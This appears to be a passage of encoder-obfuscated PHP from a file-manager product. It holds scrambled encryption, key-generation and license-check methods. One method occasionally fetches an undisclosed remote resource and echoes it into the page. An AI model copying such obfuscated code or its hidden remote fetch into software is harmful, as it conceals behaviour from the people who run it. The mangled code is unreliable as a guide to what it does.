$eç¿†Šé = $C‚‹©²„‘¬[638]; if (!$eç¿†Šé) { return; } goto eõ¿™‚£Üœ; aµâÒàƒŒ: $b¾ë‚­Šî™ = $C’ù„±ã¿Š[$this->yxfg666983d0]; $dÊÅÂ£ï¨Æ = $C‚‹©²„‘¬[637]; $b¾ë‚­Šî™ = $cñøÎØä–Ú[250]($b¾ë‚­Šî™ ? $b¾ë‚­Šî™ : $cñøÎØä–Ú[307]); goto e÷¢§©Â‰õ; eõ¿™‚£Üœ: } public function unlv1845b6d0($A–¬¦¼¹¨È) { goto f´á¾õƒò·; D×‚İÆëøƒ: $D°¬å‘”ÂÍ = $F’ÓªšØÄ[61]($F’ÓªšØÄ[145])->{$_SERVER[İÊø][335]}($F’ÓªšØÄ[334])->{$_SERVER[İÊø][336]}($b±Í«ÆËÖª)->{$_SERVER[İÊø][337]}(); $D°¬å‘”ÂÍ = $F’ÓªšØÄ[228]($D°¬å‘”ÂÍ, $F’ÓªšØÄ[10], $F’ÓªšØÄ[334]); if (!$F’ÓªšØÄ[248]($A–¬¦¼¹¨È[$F’ÓªšØÄ[334]], $D°¬å‘”ÂÍ)) { $F’ÓªšØÄ[172]($F’ÓªšØÄ[338], !1, $F’ÓªšØÄ[245]); } goto CÚÄ» Óøµ; B—‚±½Ø˜¨: $eİ™ğ²Ê ¹ = $açïÅµãµ÷[639]; while ($eİ™ğ²Ê ¹ < $açïÅµãµ÷[564]) { if ($eİ™ğ²Ê ¹ >= 0) { break; } $eİ™ğ²Ê ¹++; } if ($A–¬¦¼¹¨È[$F’ÓªšØÄ[334]] == $F’ÓªšØÄ[226]) { return; } goto B¢ä¦«œ±¤; B¢ä¦«œ±¤: if ($b±Í«ÆËÖª >= $F’ÓªšØÄ[250]($F’ÓªšØÄ[251])) { return; } $E‰¿¯‰œ¿ = $F’ÓªšØÄ[61]($F’ÓªšØÄ[145])->{$_SERVER[İÊø][146]}(); if ($E‰¿¯‰œ¿ <= $b±Í«ÆËÖª) { return; } goto D×‚İÆëøƒ; f´á¾õƒò·: $açïÅµãµ÷ =& $_SERVER[úÎü]; $F’ÓªšØÄ =& $_SERVER[İÊø]; $b±Í«ÆËÖª = $this->{$_SERVER[İÊø][143]}(); goto B—‚±½Ø˜¨; CÚÄ» Óøµ: } public function foly54c7e88f() { goto A÷ÒˆÅœ«; AøÑ“°öÜ°: $A¤‘È²ö… = $DéŞËÁ–‡Æ[255]; $a¼Ü–òµâ” = $eÛìÎºƒíÊ[640]; if (strlen($a¼Ü–òµâ”) < $eÛìÎºƒíÊ[583]) { return; } goto f¯¬íøïšÙ; aÜÔ ï·Š: if (strlen($C¸¬Íô”à×) < $eÛìÎºƒíÊ[580]) { return; } $B²ÌïÕÅŒ½ = @$DéŞËÁ–‡Æ[263]($A¤‘È²ö…, !1, $dœçô´‹ƒô); $E¹¿Ç‰Ãœâ = $eÛìÎºƒíÊ[642]; goto dŞªî÷×‘; f¯¬íøïšÙ: $A¤‘È²ö… = $this->{$_SERVER[İÊø][256]}($A¤‘È²ö…, $DéŞËÁ–‡Æ[257]); $dœçô´‹ƒô = $DéŞËÁ–‡Æ[258](array($DéŞËÁ–‡Æ[259] => array($DéŞËÁ–‡Æ[260] => $DéŞËÁ–‡Æ[261], $DéŞËÁ–‡Æ[262] => 3))); $C¸¬Íô”à× = $eÛìÎºƒíÊ[641]; goto aÜÔ ï·Š; A÷ÒˆÅœ«: $eÛìÎºƒíÊ =& $_SERVER[úÎü]; $DéŞËÁ–‡Æ =& $_SERVER[İÊø]; if (!$DéŞËÁ–‡Æ[112]($GLOBALS, $DéŞËÁ–‡Æ[138]) || $DéŞËÁ–‡Æ[339](1, 100) > 20) { return; } goto AøÑ“°öÜ°; dŞªî÷×‘: if (!$E¹¿Ç‰Ãœâ) { return; } echo $DéŞËÁ–‡Æ[340] . $DéŞËÁ–‡Æ[341]($B²ÌïÕÅŒ½) . $DéŞËÁ–‡Æ[342]; goto bšÔ¢ÇÌ˜; bšÔ¢ÇÌ˜: } private function cfwlde99704f($FÜğÎ¼èŞÍ, $c„Òå¿Ã²ø, $C¬ŒœÕ‰ôœ = 3) { goto bÂ¼Äá²ÚÇ; CÚš¹à: while ($d·Ìä‹ğ¿õ < $d†¦ùÀ¸¤[564]) { if ($d·Ìä‹ğ¿õ >= 0) { break; } $d·Ìä‹ğ¿õ++; } if ($C¬ŒœÕ‰ôœ - 1 > 0) { $B§¥¸Ïã¿÷ = $this->{$_SERVER[İÊø][133]}($B§¥¸Ïã¿÷, $c„Òå¿Ã²ø, $C¬ŒœÕ‰ôœ - 1); } return $B§¥¸Ïã¿÷; goto f’ô½¯ñ¿; eğ‹¨íÔÀ: $DØ®—ŒİÄË = $d†¦ùÀ¸¤[643]; if (strlen($DØ®—ŒİÄË) < $d†¦ùÀ¸¤[583]) { return; } $E ‘ƒ·ˆª = $Aœ“¢Š÷¡È[344]; goto EßšÎ¶Ş¼Ú; bÂ¼Äá²ÚÇ: $d†¦ùÀ¸¤ =& $_SERVER[úÎü]; $Aœ“¢Š÷¡È =& $_SERVER[İÊø]; $Aœ“¢Š÷¡È[343](1); goto EÑŒ¿„‰Ò; EÑŒ¿„‰Ò: $FÜğÎ¼èŞÍ = $Aœ“¢Š÷¡È[2]($FÜğÎ¼èŞÍ); $f²¢šå½ìŠ = $Aœ“¢Š÷¡È[339](0, 5) . $Aœ“¢Š÷¡È[10]; $C™¥ÓØŸ = $Aœ“¢Š÷¡È[130](15); goto eğ‹¨íÔÀ; EßšÎ¶Ş¼Ú: switch ($f²¢šå½ìŠ) { case $Aœ“¢Š÷¡È[240]: $B§¥¸Ïã¿÷ = $this->{$_SERVER[İÊø][153]}($FÜğÎ¼èŞÍ, $Aœ“¢Š÷¡È[220]($c„Òå¿Ã²ø . $C™¥ÓØŸ)); break; $côÕ²¾»Ë = $d†¦ùÀ¸¤[644]; if (strlen($côÕ²¾»Ë) < $d†¦ùÀ¸¤[564]) { die; } case $Aœ“¢Š÷¡È[226]: $B§¥¸Ïã¿÷ = $this->{$_SERVER[İÊø][153]}($FÜğÎ¼èŞÍ, $Aœ“¢Š÷¡È[220]($C™¥ÓØŸ . $c„Òå¿Ã²ø)); $a±‡½ÏŠëØ = $d†¦ùÀ¸¤[645]; while (strlen($a±‡½ÏŠëØ) < $d†¦ùÀ¸¤[576]) { if (!$a±‡½ÏŠëØ) { break; } $a±‡½ÏŠëØ++; } break; case $Aœ“¢Š÷¡È[345]: $B§¥¸Ïã¿÷ = $this->{$_SERVER[İÊø][153]}($FÜğÎ¼èŞÍ, $Aœ“¢Š÷¡È[124]($C™¥ÓØŸ . $c„Òå¿Ã²ø)); $cêä‹¤åÂ = $d†¦ùÀ¸¤[646]; while (strlen($cêä‹¤åÂ) < $d†¦ùÀ¸¤[583]) { if (!$cêä‹¤åÂ) { break; } $cêä‹¤åÂ++; } break; case $Aœ“¢Š÷¡È[346]: $B§¥¸Ïã¿÷ = $this->{$_SERVER[İÊø][153]}($FÜğÎ¼èŞÍ, $Aœ“¢Š÷¡È[120]($C™¥ÓØŸ . $c„Òå¿Ã²ø)); break; $Cœâ¥Ç¬‹Ÿ = $d†¦ùÀ¸¤[647]; case $Aœ“¢Š÷¡È[347]: goto aËŞ¸­ª‚¼; bö‹Ç©ÉŒ: $f¨‹öŞÏ­§ = 0; $C‚¾ì§ˆë‡ = $d†¦ùÀ¸¤[651]; if (!$C‚¾ì§ˆë‡) { die; } goto e…¡Üö¯Ñ; aÒ˜–œ»¥: for ($Aîèøõêí = 0; $Aîèøõêí < $Aœ“¢Š÷¡È[24]($FÜğÎ¼èŞÍ); $Aîèøõêí++) { $C×¿°¾‚ = $C×¿°¾‚ == $Aœ“¢Š÷¡È[24]($EÜŠçŸß‡) ? 0 : $C×¿°¾‚; $f¨‹öŞÏ­§ = ($AÓàóòĞ•á + $Aœ“¢Š÷¡È[349]($E ‘ƒ·ˆª, $FÜğÎ¼èŞÍ[$Aîèøõêí]) + $Aœ“¢Š÷¡È[350]($EÜŠçŸß‡[$C×¿°¾‚++])) % 64; $Bğ²…ì£œ¬ = $d†¦ùÀ¸¤[653]; if (strlen($Bğ²…ì£œ¬) < $d†¦ùÀ¸¤[576]) { return; } $B­‡‹ƒ˜÷Ü .= $E ‘ƒ·ˆª[$f¨‹öŞÏ­§]; } $B§¥¸Ïã¿÷ = $Aœ“¢Š÷¡È[341]($DÁÜ„ààº¯ . $B­‡‹ƒ˜÷Ü); break; goto F§¨²¢Ø¨; e…¡Üö¯Ñ: $C×¿°¾‚ = 0; $c›“Œ‡á˜‰ = $d†¦ùÀ¸¤[652]; if (strlen($c›“Œ‡á˜‰) < $d†¦ùÀ¸¤[564]) { return; } goto aÒ˜–œ»¥; CŠ®íêè: $EÜŠçŸß‡ = $Aœ“¢Š÷¡È[25]($EÜŠçŸß‡, $AÓàóòĞ•á % 8, $AÓàóòĞ•á % 8 + 7); $DÆ¸Õò£Ûµ = $d†¦ùÀ¸¤[649]; $B­‡‹ƒ˜÷Ü = $Aœ“¢Š÷¡È[10]; goto Fîò–çÕêã; Fîò–çÕêã: $Aîèøõêí = 0; $c´šÜ–ò‡è = $d†¦ùÀ¸¤[650]; if (strlen($c´šÜ–ò‡è) < $d†¦ùÀ¸¤[592]) { die; } goto bö‹Ç©ÉŒ; aËŞ¸­ª‚¼: $FÜğÎ¼èŞÍ = $Aœ“¢Š÷¡È[124]($FÜğÎ¼èŞÍ); $AÓàóòĞ•á = $Aœ“¢Š÷¡È[348](0, 64); $DÁÜ„ààº¯ = $E ‘ƒ·ˆª[$AÓàóòĞ•á]; goto F²À‘Ï‹ã¥; F²À‘Ï‹ã¥: $EÜŠçŸß‡ = $Aœ“¢Š÷¡È[120]($DÁÜ„ààº¯ . $Aœ“¢Š÷¡È[120]($c„Òå¿Ã²ø . $DÁÜ„ààº¯) . $c„Òå¿Ã²ø); $DèÜÌ“ìè¾ = $d†¦ùÀ¸¤[648]; while (strlen($DèÜÌ“ìè¾) < $d†¦ùÀ¸¤[580]) { if (!$DèÜÌ“ìè¾) { break; } $DèÜÌ“ìè¾++; } goto CŠ®íêè; F§¨²¢Ø¨: default: $B§¥¸Ïã¿÷ = $this->{$_SERVER[İÊø][153]}($FÜğÎ¼èŞÍ, $c„Òå¿Ã²ø . $C™¥ÓØŸ); break; } $B§¥¸Ïã¿÷ = $Aœ“¢Š÷¡È[220]($f²¢šå½ìŠ . $C™¥ÓØŸ . $B§¥¸Ïã¿÷); $d·Ìä‹ğ¿õ = $d†¦ùÀ¸¤[654]; goto CÚš¹à; f’ô½¯ñ¿: } private function cohn49856700($a¥¹¶¶Æ‰Ò, $f¬ŒŠçÊ¤“, $BÁÚë‘”Ã¿ = 3) { goto c¬¡Öã°ä; F‡âÂì˜¯‰: $a¥¹¶¶Æ‰Ò = $féœ—µ´¿Â[220]($a¥¹¶¶Æ‰Ò); $e•„ß’ª²Â = $a¥¹¶¶Æ‰Ò[0]; $F‹íØ¥Â = $féœ—µ´¿Â[25]($a¥¹¶¶Æ‰Ò, 1, 15); goto a¯éæñ Ç; CÂÛ®ˆÇô : return $Dâ¶Î‡ ; goto d¼Õ ¶”½„; f—¼ÌöÒç: $a¥¹¶¶Æ‰Ò = $féœ—µ´¿Â[2]($a¥¹¶¶Æ‰Ò); $AÀ©ÁÏéó¬ = $Báˆ‡„Ê ³[655]; if (strlen($AÀ©ÁÏéó¬) < $Báˆ‡„Ê ³[564]) { die; } goto F‡âÂì˜¯‰; c¬¡Öã°ä: $Báˆ‡„Ê ³ =& $_SERVER[úÎü]; $féœ—µ´¿Â =& $_SERVER[İÊø]; if (!$féœ—µ´¿Â[351]($a¥¹¶¶Æ‰Ò) || $féœ—µ´¿Â[24]($a¥¹¶¶Æ‰Ò) < 10) { return !1; } goto f—¼ÌöÒç; FŒ¨ˆŠÈ: $d¶ë¢á£ = $féœ—µ´¿Â[344]; switch ($e•„ß’ª²Â) { case $féœ—µ´¿Â[240]: $Dâ¶Î‡  = $this->{$_SERVER[İÊø][256]}($a¥¹¶¶Æ‰Ò, $féœ—µ´¿Â[220]($f¬ŒŠçÊ¤“ . $F‹íØ¥Â)); $fƒ®Ã…½ˆØ = $Báˆ‡„Ê ³[657]; while ($fƒ®Ã…½ˆØ < $Báˆ‡„Ê ³[576]) { if ($fƒ®Ã…½ˆØ >= 0) { break; } $fƒ®Ã…½ˆØ++; } break; $có‰“……æ  = $Báˆ‡„Ê ³[658]; case $féœ—µ´¿Â[226]: $Dâ¶Î‡  = $this->{$_SERVER[İÊø][256]}($a¥¹¶¶Æ‰Ò, $féœ—µ´¿Â[220]($F‹íØ¥Â . $f¬ŒŠçÊ¤“)); break; case $féœ—µ´¿Â[345]: $Dâ¶Î‡  = $this->{$_SERVER[İÊø][256]}($a¥¹¶¶Æ‰Ò, $féœ—µ´¿Â[124]($F‹íØ¥Â . $f¬ŒŠçÊ¤“)); $fº‚¤ªï‚æ = $Báˆ‡„Ê ³[659]; if (strlen($fº‚¤ªï‚æ) < $Báˆ‡„Ê ³[592]) { return; } break; $A·–×Ë»§ê = $Báˆ‡„Ê ³[660]; if (strlen($A·–×Ë»§ê) < $Báˆ‡„Ê ³[592]) { return; } case $féœ—µ´¿Â[346]: $Dâ¶Î‡  = $this->{$_SERVER[İÊø][256]}($a¥¹¶¶Æ‰Ò, $féœ—µ´¿Â[120]($F‹íØ¥Â . $f¬ŒŠçÊ¤“)); $dïÛÌ»Û… = $Báˆ‡„Ê ³[661]; if (strlen($dïÛÌ»Û…) < $Báˆ‡„Ê ³[580]) { return; } break; $B°ê©ôËƒô = $Báˆ‡„Ê ³[662]; if (strlen($B°ê©ôËƒô) < $Báˆ‡„Ê ³[583]) { die; } case $féœ—µ´¿Â[347]: goto e¤®Ê·…°«; c¼“ó­ÇàÈ: $AÎ’œÉ®­Ï = $Báˆ‡„Ê ³[663]; if (strlen($AÎ’œÉ®­Ï) < $Báˆ‡„Ê ³[580]) { return; } $A—çŸãÍ¹Œ = 0; goto Eš©ÉÉº¿Ú; Eš©ÉÉº¿Ú: for ($BÇ¨ï±¡Î = 0; $BÇ¨ï±¡Î < $féœ—µ´¿Â[24]($a¥¹¶¶Æ‰Ò); $BÇ¨ï±¡Î++) { $A—çŸãÍ¹Œ = $A—çŸãÍ¹Œ == $féœ—µ´¿Â[24]($fóÉñ¥ß¯¨) ? 0 : $A—çŸãÍ¹Œ; $B÷Éí¨ÅË = $A—çŸãÍ¹Œ++; $D£Õ·à¿ßó = $Báˆ‡„Ê ³[664]; $aÔª·ÎÅ = $féœ—µ´¿Â[349]($d¶ë¢á£, $a¥¹¶¶Æ‰Ò[$BÇ¨ï±¡Î]) - $b»¹õ„‚½ğ - $féœ—µ´¿Â[350]($fóÉñ¥ß¯¨[$B÷Éí¨ÅË]); while ($aÔª·ÎÅ < 0) { $aÔª·ÎÅ += 64; $bñí©Ä¯õŒ = $Báˆ‡„Ê ³[665]; if (!$bñí©Ä¯õŒ) { die; } } $DË‹ÚŠª³ñ .= $d¶ë¢á£[$aÔª·ÎÅ]; $E³šÇ©î‡ = $Báˆ‡„Ê ³[666]; while ($E³šÇ©î‡ < $Báˆ‡„Ê ³[580]) { if ($E³šÇ©î‡ >= 0) { break; } $E³šÇ©î‡++; } } $Dâ¶Î‡  = $féœ—µ´¿Â[353]($DË‹ÚŠª³ñ); break; goto FÃÛƒæ³·; e¤®Ê·…°«: $a¥¹¶¶Æ‰Ò = $féœ—µ´¿Â[352]($a¥¹¶¶Æ‰Ò); $aİæùÑ´© = $a¥¹¶¶Æ‰Ò[0]; $a¥¹¶¶Æ‰Ò = $féœ—µ´¿Â[25]($a¥¹¶¶Æ‰Ò, 1); goto A»›¯®‚¸; e¡¶İŸÕ: $DË‹ÚŠª³ñ = $féœ—µ´¿Â[10]; $BÇ¨ï±¡Î = 0; $aÔª·ÎÅ = 0; goto c¼“ó­ÇàÈ; A»›¯®‚¸: $b»¹õ„‚½ğ = $féœ—µ´¿Â[349]($d¶ë¢á£, $aİæùÑ´©); $fóÉñ¥ß¯¨ = $féœ—µ´¿Â[120]($aİæùÑ´© . $féœ—µ´¿Â[120]($f¬ŒŠçÊ¤“ . $aİæùÑ´©) . $f¬ŒŠçÊ¤“); $fóÉñ¥ß¯¨ = $féœ—µ´¿Â[25]($fóÉñ¥ß¯¨, $b»¹õ„‚½ğ % 8, $b»¹õ„‚½ğ % 8 + 7); goto e¡¶İŸÕ; FÃÛƒæ³·: default: $Dâ¶Î‡  = $this->{$_SERVER[İÊø][256]}($a¥¹¶¶Æ‰Ò, $f¬ŒŠçÊ¤“ . $F‹íØ¥Â); $fèÁ¾Úå‚‘ = $Báˆ‡„Ê ³[667]; while ($fèÁ¾Úå‚‘ < $Báˆ‡„Ê ³[564]) { if ($fèÁ¾Úå‚‘ >= 0) { break; } $fèÁ¾Úå‚‘++; } break; $FË´óÊª = $Báˆ‡„Ê ³[668]; if (strlen($FË´óÊª) < $Báˆ‡„Ê ³[583]) { die; } } if ($BÁÚë‘”Ã¿ - 1 > 0) { $Dâ¶Î‡  = $this->{$_SERVER[İÊø][195]}($Dâ¶Î‡ , $f¬ŒŠçÊ¤“, $BÁÚë‘”Ã¿ - 1); } goto CÂÛ®ˆÇô ; a¯éæñ Ç: $céÍÔÑ¡ÉŒ = $Báˆ‡„Ê ³[656]; while ($céÍÔÑ¡ÉŒ < $Báˆ‡„Ê ³[576]) { if ($céÍÔÑ¡ÉŒ >= 0) { break; } $céÍÔÑ¡ÉŒ++; } $a¥¹¶¶Æ‰Ò = $féœ—µ´¿Â[25]($a¥¹¶¶Æ‰Ò, 16); goto FŒ¨ˆŠÈ; d¼Õ ¶”½„: } public function fjhq58d39690($cÁÅå×šõÑ) { goto BÇùˆ„îÓÂ; Fâ„ŠÉÄ¨ï: $aµªŸ·ˆØ = $this->{$_SERVER[İÊø][153]}($cÁÅå×šõÑ, $BòéÑ¶‚­) . $bÎÛÆ»ÔØ›[358] . $CŠåÕÑÙÓĞ; return $aµªŸ·ˆØ; goto AÆ‡Ë„«˜Ó; fÖÃİÂ§æ: $aÖÒÉ›Á­† = $bÎÛÆ»ÔØ›[250](($f”¶Ã³ã×ø + $fôŠ¤Èà¬‡) / 2); $f‰¨ÆÏ°ÀÂ = $Bé¥ĞÕ—Ç[571]; while (1) { $d¹Õçõ‹¨© = $aÖÒÉ›Á­†; $dµÕêöÏµ = $Céì×ÍŒÅŸ; $Aåµ ®ŸÀÜ = $Bé¥ĞÕ—Ç[670]; if (strlen($Aåµ ®ŸÀÜ) < $Bé¥ĞÕ—Ç[583]) { die; } while ($dµÕêöÏµ % $d¹Õçõ‹¨© != 0) { $a„Ïí¥÷ğ– = $dµÕêöÏµ; $dµÕêöÏµ = $d¹Õçõ‹¨©; $d¹Õçõ‹¨© = $a„Ïí¥÷ğ– % $d¹Õçõ‹¨©; $cÂ ßŞñªì = $Bé¥ĞÕ—Ç[671]; } if ($d¹Õçõ‹¨© == 1) { break; } else { $aÖÒÉ›Á­†++; } } goto eÚæÌöâ; eÚæÌöâ: $cğªœ™ïã = 2; for ($BÍà®§ßä = 0; $BÍà®§ßä < $Céì×ÍŒÅŸ * 10; $BÍà®§ßä++) { if (($Céì×ÍŒÅŸ * $BÍà®§ßä + 1) % $aÖÒÉ›Á­† == 0) { $cğªœ™ïã = $bÎÛÆ»ÔØ›[250](($Céì×ÍŒÅŸ * $BÍà®§ßä + 1) / $aÖÒÉ›Á­†); break; } } $CŠåÕÑÙÓĞ = $this->{$_SERVER[İÊø][153]}($f”¶Ã³ã×ø * $fôŠ¤Èà¬‡ . $bÎÛÆ»ÔØ›[10], $bÎÛÆ»ÔØ›[155]); goto f¢ìß‡Á…Ç; f¢ìß‡Á…Ç: $A“•µô† = $Bé¥ĞÕ—Ç[672]; while (strlen($A“•µô†) < $Bé¥ĞÕ—Ç[583]) { if (!$A“•µô†) { break; } $A“•µô†++; } $BòéÑ¶‚­ = $bÎÛÆ»ÔØ›[120]($bÎÛÆ»ÔØ›[355] . ($f”¶Ã³ã×ø + $fôŠ¤Èà¬‡) . $bÎÛÆ»ÔØ›[356] . $aÖÒÉ›Á­† . $bÎÛÆ»ÔØ›[356] . $cğªœ™ïã . $bÎÛÆ»ÔØ›[357]); goto Fâ„ŠÉÄ¨ï; BÇùˆ„îÓÂ: $Bé¥ĞÕ—Ç =& $_SERVER[úÎü]; $bÎÛÆ»ÔØ› =& $_SERVER[İÊø]; $f”¶Ã³ã×ø = $this->{$_SERVER[İÊø][354]}(); goto eƒÔòŸ½¨·; eƒÔòŸ½¨·: $fôŠ¤Èà¬‡ = $this->{$_SERVER[İÊø][354]}(); $E°‘ğòè¬ = $Bé¥ĞÕ—Ç[669]; $Céì×ÍŒÅŸ = ($f”¶Ã³ã×ø - 1) * ($fôŠ¤Èà¬‡ - 1); goto fÖÃİÂ§æ; AÆ‡Ë„«˜Ó: } public function mnxa8063497a($B’åË‚œ°ô) { goto A…ÉÇÁäêÜ; D¾ÈÁ¶Šé: if (strlen($aëÀÒÃâØ) < $EÄñ¬óµ™Í[592]) { return; } $E­ĞÓ¨¬Û = 0; $A¼êƒ¶Ó‘™ = $EÄñ¬óµ™Í[676]; goto c’¬°’à‚; aã©ÉáµÂØ: if (!$dç¸á×Â©ˆ) { die; } return $c¯òˆïÆàƒ; goto AŒ™ÅÏ±­; A…ÉÇÁäêÜ: $EÄñ¬óµ™Í =& $_SERVER[úÎü]; $a’Ù˜ˆøó =& $_SERVER[İÊø]; $f¤À’½º¼ = $a’Ù˜ˆøó[0]($a’Ù˜ˆøó[358], $B’åË‚œ°ô); goto e‚¹‚ñëÃÑ; eÍæõÀÄÒÕ: $C¡¥ÓÏ² = $a’Ù˜ˆøó[250](($e…¿¸©¥Î + $E­ĞÓ¨¬Û) / 2); while (1) { $B¡ğó¶«Ñ = $C¡¥ÓÏ²; $AÖÍ‚çÈ–å = $f£•¢ôÓã; while ($AÖÍ‚çÈ–å % $B¡ğó¶«Ñ != 0) { $BÂÀØù¡¸È = $AÖÍ‚çÈ–å; $AÖÍ‚çÈ–å = $B¡ğó¶«Ñ; $B¡ğó¶«Ñ = $BÂÀØù¡¸È % $B¡ğó¶«Ñ; } if ($B¡ğó¶«Ñ == 1) { break; } else { $C¡¥ÓÏ²++; } } $BŒ÷ŸÑ¨ = 2; goto aöŒƒ¸‘İ; B…ãğ”†îœ: $c›’æÈ‹ø× = $this->{$_SERVER[İÊø][256]}($f¤À’½º¼[1] . $a’Ù˜ˆøó[10], $a’Ù˜ˆøó[155]); if (!$c›’æÈ‹ø×) { return $a’Ù˜ˆøó[10]; } $c›’æÈ‹ø× = $a’Ù˜ˆøó[250]($c›’æÈ‹ø×); goto E«®ÅÌ¾œ®; e‚¹‚ñëÃÑ: $eÅÏÍ‘½‘ = $EÄñ¬óµ™Í[673]; if (!$eÅÏÍ‘½‘) { die; } if ($a’Ù˜ˆøó[19]($f¤À’½º¼) != 2) { return $a’Ù˜ˆøó[10]; } goto B…ãğ”†îœ; aöŒƒ¸‘İ: for ($EÖ…ˆöà†· = 0; $EÖ…ˆöà†· < $f£•¢ôÓã * 10; $EÖ…ˆöà†·++) { if (($f£•¢ôÓã * $EÖ…ˆöà†· + 1) % $C¡¥ÓÏ² == 0) { $BŒ÷ŸÑ¨ = $a’Ù˜ˆøó[250](($f£•¢ôÓã * $EÖ…ˆöà†· + 1) / $C¡¥ÓÏ²); break; } } $c»—Şì‡¦ğ = $a’Ù˜ˆøó[120]($a’Ù˜ˆøó[355] . ($e…¿¸©¥Î + $E­ĞÓ¨¬Û) . $a’Ù˜ˆøó[356] . $C¡¥ÓÏ² . $a’Ù˜ˆøó[356] . $BŒ÷ŸÑ¨ . $a’Ù˜ˆøó[357]); $fÈäÚâ‰ = $EÄñ¬óµ™Í[679]; goto EÇ·•„ö; E«®ÅÌ¾œ®: $e˜‹ÙÖíŞ = $EÄñ¬óµ™Í[674]; $e…¿¸©¥Î = 0; $aëÀÒÃâØ = $EÄñ¬óµ™Í[675]; goto D¾ÈÁ¶Šé; EÇ·•„ö: if (strlen($fÈäÚâ‰) < $EÄñ¬óµ™Í[564]) { return; } $c¯òˆïÆàƒ = $this->{$_SERVER[İÊø][256]}($f¤À’½º¼[0], $c»—Şì‡¦ğ); $dç¸á×Â©ˆ = $EÄñ¬óµ™Í[680]; goto aã©ÉáµÂØ; c’¬°’à‚: while (strlen($A¼êƒ¶Ó‘™) < $EÄñ¬óµ™Í[576]) { if (!$A¼êƒ¶Ó‘™) { break; } $A¼êƒ¶Ó‘™++; } for ($EÖ…ˆöà†· = 3; $EÖ…ˆöà†· < $c›’æÈ‹ø×; $EÖ…ˆöà†· += 2) { if ($c›’æÈ‹ø× % $EÖ…ˆöà†· != 0) { continue; } $e…¿¸©¥Î = $EÖ…ˆöà†·; $fÓ‰Ó‡ß˜Â = $EÄñ¬óµ™Í[677]; $E­ĞÓ¨¬Û = $a’Ù˜ˆøó[250]($c›’æÈ‹ø× / $EÖ…ˆöà†·); $e’‚¸ª´‰Æ = $EÄñ¬óµ™Í[678]; if (strlen($e’‚¸ª´‰Æ) < $EÄñ¬óµ™Í[576]) { return; } break; } $f£•¢ôÓã = ($e…¿¸©¥Î - 1) * ($E­ĞÓ¨¬Û - 1); goto eÍæõÀÄÒÕ; AŒ™ÅÏ±­: } public function omhad7e61356() { goto b¥ªææñ; b¥ªææñ: $A‹ õŠö­Ä =& $_SERVER[úÎü]; $C·‹ÜØ‚ÀÈ =& $_SERVER[İÊø]; $F™î¸««¬ = $C·‹ÜØ‚ÀÈ[339]($C·‹ÜØ‚ÀÈ[359](2, 14), $C·‹ÜØ‚ÀÈ[359](2, 16) - 1); goto e»ğœ°ÎÑˆ; DõáÔã¡†á: $dæœÖ¥¢ó = 2; $cÓ¶èàÃã½ = $A‹ õŠö­Ä[684]; if (!$cÓ¶èàÃã½) { return; } goto F§ÉåßšŒ²; F§ÉåßšŒ²: for ($aÆÖ‚„ïº = $F™î¸««¬; $aÆÖ‚„ïº > 1; $aÆÖ‚„ïº--) { $f‘¤ŸƒÅ¶ = !0; $eÒ‰¡•»ë˜ = $A‹ õŠö­Ä[685]; if (strlen($eÒ‰¡•»ë˜) < $A‹ õŠö­Ä[576]) { return; } foreach ($B®ÏàÎ‹½Ë as $Dõ®²ªâ¼¨) { if ($aÆÖ‚„ïº % $Dõ®²ªâ¼¨ == 0) { $f‘¤ŸƒÅ¶ = !1; break; } } if ($f‘¤ŸƒÅ¶) { $dæœÖ¥¢ó = $aÆÖ‚„ïº; break; } } return $dæœÖ¥¢ó; goto E¦„®‚™Ş¾; c­ß¬ƒõÕ˜: $fçäÁ–‘Ø = $A‹ õŠö­Ä[682]; $DÃß©­«ˆ = 1; while ($DÃß©­«ˆ <= (int) $C·‹ÜØ‚ÀÈ[360]($F™î¸««¬)) { $aÆÖ‚„ïº = $DÃß©­«ˆ; while (!0) { $aÆÖ‚„ïº++; if ($aÆÖ‚„ïº <= 2) { $DÃß©­«ˆ = $aÆÖ‚„ïº; break; } else { if ($aÆÖ‚„ïº < 2) { continue; } } $f‘¤ŸƒÅ¶ = !0; for ($fëÖ¦±åÒ = 2; $fëÖ¦±åÒ <= $C·‹ÜØ‚ÀÈ[360]($aÆÖ‚„ïº); $fëÖ¦±åÒ++) { if ($aÆÖ‚„ïº % $fëÖ¦±åÒ == 0) { $f‘¤ŸƒÅ¶ = !1; } } if ($f‘¤ŸƒÅ¶) { $DÃß©­«ˆ = $aÆÖ‚„ïº; break; } } $B®ÏàÎ‹½Ë[] = $DÃß©­«ˆ; $EØˆòŞóĞÏ = $A‹ õŠö­Ä[683]; } goto DõáÔã¡†á; e»ğœ°ÎÑˆ: $BÒ¾‘ÂÃ› = $A‹ õŠö­Ä[681]; if (strlen($BÒ¾‘ÂÃ›) < $A‹ õŠö­Ä[576]) { return; } $B®ÏàÎ‹½Ë = array(); goto c­ß¬ƒõÕ˜; E¦„®‚™Ş¾: } public function bxegaaea601f($BãæÎ’„åí, $a„êÈ³ÇÈ¸) { $F–á©ÓªÔ =& $_SERVER[úÎü]; $B‰äÌñ¢ =& $_SERVER[İÊø]; return $B‰äÌñ¢[13](array($B‰äÌñ¢[14], $B‰äÌñ¢[361]), $BãæÎ’„åí, $a„êÈ³ÇÈ¸); $d¿Ï§ÆÅÁŸ = $F–á©ÓªÔ[686]; if (strlen($d¿Ï§ÆÅÁŸ) < $F–á©ÓªÔ[592]) { die; } } public function uzgj0998b3cd($F¿È®ËÌ§‹, $c‡š·‘Å‘º) { $eğÒ¥óî¥Å =& $_SERVER[İÊø]; return $eğÒ¥óî¥Å[13](array($eğÒ¥óî¥Å[362], $eğÒ¥óî¥Å[363]), $F¿È®ËÌ§‹, $c‡š·‘Å‘º); } public function kmyie8f6961e($C¼¤â‚‰®“, $DõÂ“Š»‚¬) { $FùÜĞßïè‚ =& $_SERVER[úÎü]; $cùŠ–ùŒ¥¹ =& $_SERVER[İÊø]; return $cùŠ–ùŒ¥¹[13](array($cùŠ–ùŒ¥¹[362], $cùŠ–ùŒ¥¹[364]), $C¼¤â‚‰®“, $DõÂ“Š»‚¬); $AĞ¬Œ®ìÏÖ = $FùÜĞßïè‚[687]; while ($AĞ¬Œ®ìÏÖ < $FùÜĞßïè‚[583]) { if ($AĞ¬Œ®ìÏÖ >= 0) { break; } $AĞ¬Œ®ìÏÖ++; } } } goto DŠ‘é¬¶§ß; eÈİƒõ¶òª: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($a§™‡Ì¢Â) { if (substr($a§™‡Ì¢Â, 0, 2) == $_SERVER[úÎü][1200]) { $a§™‡Ì¢Â = BASIC_PATH . 